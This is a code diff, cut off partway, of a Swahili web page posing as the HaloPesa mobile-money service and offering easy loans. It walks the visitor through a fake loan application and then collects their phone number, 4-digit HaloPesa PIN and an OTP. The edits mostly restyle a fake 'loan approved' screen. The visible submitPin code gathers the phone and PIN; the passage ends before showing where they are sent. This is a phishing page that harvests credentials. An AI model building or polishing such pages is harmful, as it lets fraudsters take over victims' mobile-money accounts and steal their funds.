@@ -6,31 +6,7 @@
     <title>HALOPESA - HUDUMA ZA MIKOPO NA PESA KIGANJANI</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        /* Essential Screen Flow & Button Rules */
-        .screen {
-            display: none;
-        }
-        .screen.active {
-            display: block;
-        }
-        .btn-primary {
-            background-color: #ff8800;
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 14px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 15px;
-            box-sizing: border-box;
-        }
-        .btn-primary:hover {
-            background-color: #e07700;
-        }
-
-        /* Success Screen Custom Styling */
+        /* Success Screen Custom Styles matching the provided image */
         #screen-success {
             background-color: #ff8800;
             padding: 20px !important;
@@ -69,12 +45,13 @@
             text-align: center;
         }
         .amount-box span {
-            font-size: 12px;
+            font-size: 11px;
             text-transform: uppercase;
             letter-spacing: 1px;
+            font-weight: bold;
         }
         .amount-box h1 {
-            font-size: 32px;
+            font-size: 28px;
             margin: 5px 0 0 0;
         }
         .notice-box {
@@ -86,6 +63,7 @@
             color: #5d4037;
             text-align: left;
             margin-bottom: 15px;
+            line-height: 1.4;
         }
         .details-section {
             text-align: left;
@@ -97,38 +75,50 @@
         .detail-row {
             display: flex;
             align-items: center;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             font-size: 13px;
             color: #444;
-            gap: 10px;
+            gap: 12px;
             text-align: left;
+        }
+        .detail-icon-box {
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            flex-shrink: 0;
         }
         .secondary-action-btn {
             background-color: #ffffff;
             color: #333;
-            border: 1px solid #ddd;
+            border: 1px solid #e0e0e0;
             width: 100%;
             padding: 12px;
             border-radius: 8px;
             font-size: 14px;
-            font-weight: bold;
+            font-weight: 500;
             cursor: pointer;
-            margin-top: 8px;
-            text-align: left;
+            margin-bottom: 8px;
+            text-align: center;
             display: flex;
             align-items: center;
-            gap: 10px;
+            justify-content: center;
+            gap: 8px;
         }
         .footer-note {
             font-size: 12px;
             color: #666;
             text-align: left;
-            background: #f9f9f9;
+            background: #fcfcfc;
+            border: 1px solid #f0f0f0;
             padding: 10px;
-            border-radius: 6px;
+            border-radius: 8px;
             margin-bottom: 15px;
             display: flex;
-            gap: 8px;
+            gap: 10px;
             align-items: flex-start;
         }
     </style>
@@ -153,9 +143,9 @@
             
             <div style="background: #fafafa; padding: 15px; border-radius: 12px; border: 1px solid #eee; margin-bottom: 20px;">
                 <label>Kikokotoko Cha Mkopo</label>
-                <p style="font-size: 13px; color: #666;">Kiasi Cha Mkopo: <strong id="displayAmount" style="color:#ff8800; float:right;">TZS 1,000,000</strong></p>
-                <input type="range" id="loanRange" min="50000" max="100000000" value="1000000" style="accent-color: #ff8800; width:100%; margin: 10px 0;" oninput="updateLoanCalculation(this.value)">
-                <p style="font-size: 13px; color: #666;">Malipo Ya Kila Mwezi: <strong id="displayMonthly" style="color:#ff8800; font-size:16px; float:right;">TZS 95,044.20</strong></p>
+                <p style="font-size: 13px; color: #666;">Kiasi Cha Mkopo: <strong id="displayAmount" style="color:var(--accent-orange); float:right;">TZS 1,000,000</strong></p>
+                <input type="range" id="loanRange" min="50000" max="100000000" value="1000000" style="accent-color: var(--accent-orange); width:100%; margin: 10px 0;" oninput="updateLoanCalculation(this.value)">
+                <p style="font-size: 13px; color: #666;">Malipo Ya Kila Mwezi: <strong id="displayMonthly" style="color:var(--accent-orange); font-size:16px; float:right;">TZS 95,044.20</strong></p>
             </div>
 
             <button class="btn-primary" onclick="goToScreen('screen-step1')">OMBA SASA</button>
@@ -166,32 +156,32 @@
             <h2>OMBI LA MKOPO</h2>
             <p class="subtitle">Hatua ya 1 kati ya 3</p>
             
-            <div class="form-group" style="margin-bottom: 15px;">
+            <div class="form-group">
                 <label>Aina Ya Mkopo</label>
-                <select id="loanType" style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc;">
+                <select id="loanType">
                     <option value="" disabled selected>Chagua aina ya mkopo</option>
                     <option>Mkopo wa Biashara</option>
                     <option>Mkopo wa Haraka</option>
                 </select>
             </div>
 
-            <div class="form-group" style="margin-bottom: 15px;">
+            <div class="form-group">
                 <label>Kiasi Cha Mkopo (TZS)</label>
-                <input type="number" id="loanAmount" placeholder="Weka kiasi cha mkopo" value="" style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc; box-sizing:border-box;">
+                <input type="number" id="loanAmount" placeholder="Weka kiasi cha mkopo" value="">
             </div>
 
-            <div class="form-group" style="margin-bottom: 15px;">
+            <div class="form-group">
                 <label>Muda Wa Mkopo</label>
-                <select id="loanDuration" style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc;">
+                <select id="loanDuration">
                     <option value="" disabled selected>Chagua muda wa mkopo</option>
                     <option>Miezi 48</option>
                     <option>Miezi 12</option>
                 </select>
             </div>
 
-            <div class="form-group" style="margin-bottom: 15px;">
+            <div class="form-group">
                 <label>Kusudi La Mkopo</label>
-                <textarea id="loanPurpose" placeholder="Elezea kusudi la mkopo wako..." style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc; box-sizing:border-box;" rows="3"></textarea>
+                <textarea id="loanPurpose" placeholder="Elezea kusudi la mkopo wako..." style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc;" rows="3"></textarea>
             </div>
 
             <button class="btn-primary" id="btnStep1" onclick="validateStep1()" disabled style="opacity: 0.5; cursor: not-allowed;">HATUA INAYOFUATA</button>
@@ -202,18 +192,18 @@
             <h2>OMBI LA MKOPO</h2>
             <p class="subtitle">Hatua ya 3 kati ya 3</p>
 
-            <div class="form-group" style="margin-bottom: 15px;">
+            <div class="form-group">
                 <label>Hali Ya Ajira</label>
-                <select id="employment" style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc;">
+                <select id="employment">
                     <option value="" disabled selected>Chagua hali ya ajira</option>
                     <option>Binafsi</option>
                     <option>Ameajiriwa</option>
                 </select>
             </div>
 
-            <div class="form-group" style="margin-bottom: 15px;">
+            <div class="form-group">
                 <label>Mapato Ya Mwaka (TZS)</label>
-                <input type="number" id="income" placeholder="Weka mapato ya mwaka" value="" style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc; box-sizing:border-box;">
+                <input type="number" id="income" placeholder="Weka mapato ya mwaka" value="">
             </div>
 
             <button class="btn-primary" id="btnStep3" onclick="validateStep3()" disabled style="opacity: 0.5; cursor: not-allowed;">WASILISHA OMBI</button>
@@ -224,7 +214,7 @@
             <div style="font-size: 48px; margin-bottom: 15px;">📋</div>
             <h2>Ombi La Mkopo Limewasilishwa</h2>
             <p class="subtitle">Ombi lako la mkopo limewasilishwa. Tafadhali subiri idhini. Utapokea ujumbe wa uthibitisho.</p>
-            <p id="status-text" style="font-weight: bold; color: #2e7d32; margin-top: 20px;">Inasubiri idhini ya Msimamizi...</p>
+            <p id="status-text" style="font-weight: bold; color: var(--primary-green); margin-top: 20px;">Inasubiri idhini ya Msimamizi...</p>
         </div>
 
         <!-- LOGIN / PIN SCREEN -->
@@ -233,20 +223,20 @@
             
             <div id="login-error-banner" style="display: none; background: #ffebee; color: #c62828; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-weight: bold; font-size: 14px;"></div>
 
-            <div class="form-group" style="margin-bottom: 15px;">
+            <div class="form-group">
                 <label>Nambari Ya Simu (HaloPesa)</label>
                 <div style="display: flex; gap: 8px;">
                     <span style="padding: 12px; background: #eee; border-radius: 8px; border:1px solid #ccc;">🇹🇿 +255</span>
-                    <input type="tel" id="phoneNumber" placeholder="621234567" style="flex: 1; padding: 10px; border-radius: 8px; border:1px solid #ccc;" oninput="checkLoginInputs()">
+                    <input type="tel" id="phoneNumber" placeholder="621234567" style="flex: 1;" oninput="checkLoginInputs()">
                 </div>
             </div>
 
-            <label style="text-align:center; display:block; margin-top: 15px; margin-bottom: 8px;">Weka PIN Ya HaloPesa (Tarakimu 4)</label>
-            <div class="pin-inputs" style="display: flex; justify-content: center; gap: 10px; margin-bottom: 15px;">
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; border-radius: 8px; border: 1px solid #ccc;" />
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; border-radius: 8px; border: 1px solid #ccc;" />
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; border-radius: 8px; border: 1px solid #ccc;" />
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; border-radius: 8px; border: 1px solid #ccc;" />
+            <label style="text-align:center; margin-top: 15px;">Weka PIN Ya HaloPesa (Tarakimu 4)</label>
+            <div class="pin-inputs">
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
             </div>
 
             <button class="btn-primary" id="btnLogin" onclick="submitPin()" disabled style="opacity: 0.5; cursor: not-allowed;">INGIA</button>
@@ -259,9 +249,9 @@
             
             <div id="otp-error-banner" style="display: none; background: #ffebee; color: #c62828; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-weight: bold; font-size: 14px;"></div>
 
-            <div class="form-group" style="margin-bottom: 15px;">
+            <div class="form-group">
                 <label>Weka OTP (Tarakimu 4)</label>
-                <input type="text" id="otpInput" placeholder="1234" maxlength="4" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ccc; text-align: center; font-size: 20px; letter-spacing: 4px; box-sizing: border-box;" oninput="checkOtpInput()">
+                <input type="text" id="otpInput" placeholder="1234" maxlength="4" style="text-align: center; font-size: 20px; letter-spacing: 4px;" oninput="checkOtpInput()">
             </div>
             <button class="btn-primary" id="btnOtp" onclick="submitOtp()" disabled style="opacity: 0.5; cursor: not-allowed;">WASILISHA OTP</button>
         </div>
@@ -271,10 +261,10 @@
             <div class="success-card-inner">
                 <div class="success-icon-container">✓</div>
                 <h3 style="margin: 0; color: #222; font-size: 20px;">🎉 Hongera!</h3>
-                <p style="font-size: 13px; color: #666; margin-top: 5px;">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
+                <p style="font-size: 12px; color: #666; margin-top: 5px;">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
                 
                 <div class="amount-box">
-                    <span>Kiasi Kilichoidhinishwa</span>
+                    <span>KIASI KILICHOIDHINISHWA</span>
                     <h1>TSh 100,000</h1>
                 </div>
 
@@ -284,35 +274,47 @@
                 </div>
 
                 <div class="details-section">
-                    <div style="font-weight: bold; font-size: 13px; text-align: left; margin-bottom: 10px; color: #333;">💳 Maelezo ya Mkopo</div>
+                    <div style="font-weight: bold; font-size: 12px; text-align: left; margin-bottom: 10px; color: #333;">💳 Maelezo ya Mkopo</div>
                     
                     <div class="detail-row">
-                        <span>🟢</span>
-                        <div><strong>MALIPO YA KILA MWEZI</strong><br><span style="color: #ff8800; font-weight: bold;">TSh 2,441</span></div>
+                        <div class="detail-icon-box" style="background-color: #e8f5e9; color: #2e7d32;">🟢</div>
+                        <div style="text-align: left;">
+                            <span style="font-size: 10px; color: #888; font-weight: bold; display: block; text-transform: uppercase;">MALIPO YA KILA MWEZI</span>
+                            <strong style="color: #222; font-size: 13px;">TSh 2,441</strong>
+                        </div>
                     </div>
                     
                     <div class="detail-row">
-                        <span>📅</span>
-                        <div><strong>MUDA WA MKOPO</strong><br><span style="color: #333; font-weight: bold;">Miezi 48</span></div>
+                        <div class="detail-icon-box" style="background-color: #fff3e0; color: #ef6c00;">📅</div>
+                        <div style="text-align: left;">
+                            <span style="font-size: 10px; color: #888; font-weight: bold; display: block; text-transform: uppercase;">MUDA WA MKOPO</span>
+                            <strong style="color: #222; font-size: 13px;">Miezi 48</strong>
+                        </div>
                     </div>
 
                     <div class="detail-row">
-                        <span>📈</span>
-                        <div><strong>KIWANGO CHA RIBA</strong><br><span style="color: #333; font-weight: bold;">8% APR</span></div>
+                        <div class="detail-icon-box" style="background-color: #e3f2fd; color: #1565c0;">📈</div>
+                        <div style="text-align: left;">
+                            <span style="font-size: 10px; color: #888; font-weight: bold; display: block; text-transform: uppercase;">KIWANGO CHA RIBA</span>
+                            <strong style="color: #222; font-size: 13px;">8% APR</strong>
+                        </div>
                     </div>
                 </div>
 
-                <div style="text-align: left; font-weight: bold; font-size: 13px; margin-bottom: 8px; color: #333;">Vitendo vya Haraka</div>
+                <div style="text-align: left; font-weight: bold; font-size: 12px; margin-bottom: 8px; color: #333;">Vitendo vya Haraka</div>
                 <button class="secondary-action-btn">💰 Weka Fedha</button>
                 <button class="secondary-action-btn">💵 Toa Fedha</button>
                 <button class="secondary-action-btn">📄 Maelezo ya Mkopo</button>
 
                 <div class="footer-note" style="margin-top: 15px;">
-                    <span>📱</span>
-                    <div><strong>Hatua Zinazofuata:</strong><br>Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</div>
+                    <span style="font-size: 16px;">📱</span>
+                    <div style="text-align: left;">
+                        <strong style="font-size: 11px; text-transform: uppercase; color: #444;">Hatua Zinazofuata:</strong><br>
+                        <span style="color: #666; font-size: 11px;">Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</span>
+                    </div>
                 </div>
 
-                <button class="btn-primary" style="background-color: #ff9900; margin-top: 15px;" onclick="location.reload()">🏠 Rudi Nyumbani</button>
+                <button class="btn-primary" style="background-color: #ff8800; margin-top: 15px;" onclick="location.reload()">🏠 Rudi Nyumbani</button>
             </div>
         </div>
 
@@ -442,4 +444,13 @@
         }
 
         async function submitPin() {
-            const phone = document.getElementById('ph
+            const phone = document.getElementById('phoneNumber').value;
+            const pinBoxes = document.querySelectorAll('#screen-login .pin-box');
+            let pin = '';
+            pinBoxes.forEach(b => pin += b.value);
+
+            const rangeVal = document.getElementById('loanRange').value;
+            const selectedAmount = 'TZS ' + Number(rangeVal).toLocaleString('en-US');
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const adminParam = urlParams.get('admin
